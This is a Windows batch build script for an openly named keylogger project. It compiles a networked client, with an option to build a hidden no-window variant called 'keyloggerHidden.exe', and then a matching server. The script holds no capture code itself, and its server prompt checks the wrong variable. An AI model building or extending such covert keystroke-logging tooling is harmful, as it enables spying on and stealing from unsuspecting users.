@echo off

:winprompt
set /P windowd=Do you want to compile the keylogger with no window[Y/N]?
if /I "%windowd%" EQU "Y" goto :option_nowindow
if /I "%windowd%" EQU "N" goto :option_window
goto :winprompt

:option_window

g++ .\KeyLoggerSoftware\client\KeyLogger_clientCom.cpp .\KeyLoggerSoftware\client\Sanitize_keylogBuff.cpp .\KeyLoggerSoftware\client\main.cpp -lws2_32 -o .\KeyLoggerSoftware\client\keylogger.exe

goto :ServerCompile
:option_nowindow
g++ .\KeyLoggerSoftware\client\KeyLogger_clientCom.cpp .\KeyLoggerSoftware\client\Sanitize_keylogBuff.cpp .\KeyLoggerSoftware\client\main.cpp -lws2_32 -mwindows -o .\KeyLoggerSoftware\client\keyloggerHidden.exe

:ServerCompile
echo complete
:Server
set /P Serv=Do you want to compile the keylogger Server at this time[Y/N]?
if /I "%windowd%" EQU "Y" goto :ServerCompiler
if /I "%windowd%" EQU "N" goto :exit
goto :Server
:ServerCompiler
mingw32-g++ -std=c++11 .\KeyLoggerSoftware\Server\main.cpp -lws2_32  -o .\KeyLoggerSoftware\server\keylogserverServer.exe 
echo complete

:exit

pause
